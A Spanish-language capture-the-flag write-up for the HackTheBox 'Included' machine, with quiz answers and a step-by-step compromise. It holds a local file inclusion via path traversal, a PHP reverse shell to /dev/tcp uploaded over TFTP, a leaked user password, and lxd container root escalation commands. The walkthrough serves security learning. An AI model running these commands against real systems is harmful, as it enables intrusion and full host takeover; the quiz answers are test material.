1)¿Qué servicio se está ejecutando en la máquina de destino a través de UDP?
	tftp

2)¿A qué clase de vulnerabilidad se enfrenta la página web alojada en el puerto 80?
	local file inclusion
	Podemos leer archivos por el path traversal que encontramos

3)¿Cuál es la carpeta del sistema por defecto que utiliza TFTP para almacenar archivos?
	/var/lib/tftpboot/

4)¿Qué archivo interesante se encuentra en la carpeta del servidor web y puede utilizarse para el Movimiento Lateral?
	.htpasswd

5)¿Cuál es el grupo del que forma parte el usuario Mike y que puede ser explotado para la Escalada de Privilegios?
	lxd

6)Cuando utilizamos una imagen para explotar un sistema mediante contenedores, buscamos una distribución muy pequeña. Nuestra favorita para esta tarea tiene nombre de montaña. ¿Cómo se llama esa distribución?
	Alpine
	**Alpine Linux** es una distribución de Linux muy ligera y segura, diseñada para ser pequeña (unos pocos MB) y eficiente.  
	Es muy usada en contenedores Docker por su velocidad, bajo consumo de recursos y simplicidad.  
	Viene con BusyBox y musl libc, lo que la hace ideal para entornos minimalistas o de hacking.

7)¿Qué bandera ponemos al contenedor para que tenga privilegios de root en el sistema anfitrión?
	security.privileged=true

8)Si el sistema de archivos raíz está montado en /mnt en el contenedor, ¿dónde se puede encontrar la bandera raíz en el contenedor después de montar el sistema anfitrión?
	/mnt/root

----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.207.145
nmap -sS -vvv -n -Pn --min-rate 5000 -p- --open 10.129.207.145 -oG allports
nmap -sCV -p80 10.129.207.145 -oN target
```

![[Included2.png]]
![[Included1.png]]
 
*TTL:* Maquina linux por su cercania a 64
*Puertos*
	`80` HTTP apache


### Las preguntas de HTB nos decia que hagamos un escaneo en UDP

```shell
nmap -sU -Pn -n -vvv --top-ports 200 10.129.207.145 -oN udp-scan
```


![[Included6.png]]
*Puertos:*
`68` dhcpc
`69` tftp

------
# [[Whatweb-wappalyzer]]

![[Included3.png]]
![[Included4.png]]
El directorio images no nos da ninguna informacion relevante y el whatweb tampoco

--------
# [[LFI(Local File Inclusion)]]
Entramos a la pagina web
![[Included7.png]]
Vemos lo de file=home.php, asi que vamos a probar un [[Path traversal]]

http://10.129.207.145/?file=../../../../../../../..//etc/hosts

![[Included5.png]]
Podemos ver el contenido del /etc/hosts asi que se es ta produciendo un [[LFI(Local File Inclusion)]]

### Hacemos pruebas para ver si interprea archivos .php

Subimos un archivo test.php con [[tftp]]
```php
<?php echo "Hola"; ?>
```

Para conectarnos al servicio usamos`tftp 10.129.117.155 69` y luego para subir el archivo `put test.php`
![[Included8.png]]

![[Included9.png]]
Como podemos ver se interpreto perfectamente

----------
# [[Reverse shell]]


Creamos el archivo shell.php
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.21/443 0>&1'");
?>
```

Y lo vamos a subir con [[tftp]]
Para conectarnos al servicio usamos`tftp 10.129.117.155 69` y luego para subir el archivo `put shell.php`
![[Included8.png]]

Y para que se ejecute vamos a leer el archivo con el [[LFI(Local File Inclusion)]]
Esta ruta la sabemos por que es el directorio predeterminado en el cual tftp sube los archivos
http://10.129.117.155/?file=../../../../../../..///var/lib/tftpboot/shell.php
Mientras estamos en escucha con [[nc -nlvp 443]] 

![[Included10.png]]
Y ya estamos adentro como el usuario www-data

-------
# [[Tratamiento de la TTY]]

---------
# Escalada de privilegios al usuario mike 

Listando todos los archivos del directorio con [[ls]] `ls -la` Pudimos ver el archivo oculto de *.htaccess* y al catearlo vemos que nos da un pregunto usuario y contraseña

![[Included11.png]]
mike:Sheffield19
Con el comando `su mike` y ponemos la contraseña *Sheffield19*
![[Included12.png]]
Y ya somos el usuario mike

----------
# Escalada al usuario root con [[Lxd contenedor con montura]]

[Articulo hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html)

Para descargar la imagen y crearla en nuestra maquina
```
git clone https://github.com/saghul/lxd-alpine-builder  
cd lxd-alpine-builder  
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine  
sudo ./build-alpine -a i686
```
Despues nos pusimos en escucha con [[python3 -m http.server]] . Y desde la maquina victima con `wget 10.10.14.8:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz` descargamos la imagen

#### Ahora para levantar el contenedor:
```shell
lxc image import ./alpine*.tar.gz --alias myimage  
lxd init  
lxc init myimage mycontainer -c security.privileged=true  
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true  
lxc start mycontainer  
lxc exec mycontainer /bin/bash
```
Una vez hecho esto ya podemos ya podemos catear las flags por que somos root

![[Included13.png]]


-------------
# Creditos

[Writeup de 13xch](https://medium.com/infosec-watchtower/hackthebox-write-up-included-8e54530c622c)